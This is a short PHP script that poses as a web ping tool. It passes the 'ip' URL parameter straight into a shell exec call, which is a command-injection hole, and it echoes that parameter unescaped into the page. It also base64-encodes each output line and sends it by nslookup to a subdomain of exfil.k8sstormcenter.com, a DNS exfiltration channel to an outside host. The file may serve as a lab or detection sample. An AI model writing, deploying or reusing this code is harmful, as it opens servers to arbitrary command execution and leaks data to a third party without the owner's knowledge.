<?php
// Get the IP address from the URL parameter
$ip = $_GET['ip'];

// Execute the ping command
exec("ping -c 4 $ip", $output, $return_var);

// Format and display the result
echo "<pre>";
echo "<strong>Ping results for $ip:</strong><br>";

// Iterate through each line of the output
foreach ($output as $line) {
    // Highlight successful pings in green
    if (strpos($line, "icmp_seq") !== false && strpos($line, "time=") !== false) {
        echo "<span style='color: #4caf50;'>" . htmlspecialchars($line) . "</span><br>";
    } else {
        echo htmlspecialchars($line) . "<br>";
    }
    // Exfiltrate each line of the ping result via DNS query
    $encoded_line = base64_encode($line); // Encode the line to make it DNS-safe
    $dns_query = $encoded_line . ".exfil.k8sstormcenter.com";
    exec("nslookup $dns_query > /dev/null 2>&1"); // Send the DNS query
}

echo "</pre>";

// Display the return status
echo "<strong>Return status:</strong> $return_var";
?>